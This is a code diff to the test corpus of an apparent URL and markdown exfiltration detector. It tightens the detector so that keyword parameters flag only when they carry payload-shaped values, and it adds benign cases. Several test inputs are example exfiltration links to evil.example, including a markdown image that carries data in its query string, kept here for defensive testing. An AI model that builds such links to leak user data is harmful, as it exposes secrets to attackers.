@@ -159,14 +159,16 @@ const CORPUS = {
   ],
   exfil: [
     {
+      // A payload-shaped (44-char base64) value: a SHORT keyword-param value
+      // like `payload=QUJDRE…` no longer flags on the name alone (finding #20).
       name: "link-query-base64",
-      input: "[c](https://evil.example/t?payload=QUJDREVGR0hJSktMTU5P)",
+      input: `[c](https://evil.example/t?payload=${"A".repeat(44)})`,
       reason: "suspicious query parameter",
       isImage: false,
     },
     {
       name: "image-query-base64",
-      input: "![i](https://evil.example/p.png?data=QUJDREVGR0hJSktM)",
+      input: `![i](https://evil.example/p.png?data=${"A".repeat(44)})`,
       reason: "suspicious query parameter",
       isImage: true,
     },
@@ -210,8 +212,10 @@ const CORPUS = {
   ],
   url: [
     {
+      // A keyword param flags only when its value is payload-shaped: a 44-char
+      // base64 blob in `token=` is exfil; a short `?token=abc` is not (#20).
       name: "token-query-param",
-      input: `https://evil.example/log?token=${NEEDLE}`,
+      input: `https://evil.example/log?token=${"A".repeat(44)}`,
       reason: "suspicious query parameter",
     },
     {
@@ -226,7 +230,7 @@ const CORPUS = {
     },
     {
       name: "fragment-keyword-exfil",
-      input: `https://ok.example/p#token=${NEEDLE}`,
+      input: `https://ok.example/p#token=${"a".repeat(64)}`,
       reason: "suspicious query parameter",
     },
     {
@@ -245,8 +249,10 @@ const CORPUS = {
       reason: "suspicious query parameter",
     },
     {
+      // One benign param (`page=2`) plus one payload-shaped keyword param: a
+      // SHORT `session=abcdef` no longer flags on the name alone (#20).
       name: "multi-param-one-exfil",
-      input: "https://ok.example/p?page=2&session=abcdef",
+      input: `https://ok.example/p?page=2&session=${"A".repeat(44)}`,
       reason: "suspicious query parameter",
     },
     {
@@ -284,10 +290,31 @@ const CORPUS = {
       input: "https://ok.example/p?a=1#x=" + "a".repeat(64),
       reason: "suspicious query parameter",
     },
+    {
+      // Retained true positive for finding #20: a long high-entropy value in a
+      // keyword param IS payload-shaped and still flags after the name-only arm
+      // was replaced by value-gating.
+      name: "keyword-data-blob-retained",
+      input: "https://evil.example/c?data=" + "A".repeat(64),
+      reason: "suspicious query parameter",
+    },
   ],
   urlBenign: [
     { name: "fragment-anchor", input: "https://ok.example/page#section-2" },
     { name: "safe-query", input: "https://ok.example/safe?q=hello" },
+    // Finding #20 precision corpus: keyword-named params whose VALUE is short /
+    // low-entropy must NOT flag on the param name alone. Each of these used to
+    // fire ("?key=", "?d=", "?session=", "?auth=") and drowned the real signal.
+    { name: "keyword-utm-source", input: "https://e.com/p?utm_source=news" },
+    { name: "keyword-short-gclid", input: "https://e.com/p?gclid=Cj0short" },
+    { name: "keyword-d-3", input: "https://e.com/p?d=3" },
+    {
+      name: "keyword-public-mapkey",
+      input: "https://e.com/p?key=pk_public_mapkey",
+    },
+    { name: "keyword-session-ok", input: "https://e.com/p?session=ok" },
+    { name: "keyword-cursor-abc", input: "https://e.com/p?cursor=abc" },
+    { name: "keyword-auth-ok", input: "https://e.com/p?auth=ok" },
     { name: "small-data-image", input: "data:image/png;base64,iVBORw0KGgo=" },
     {
       name: "signed-cdn-link",
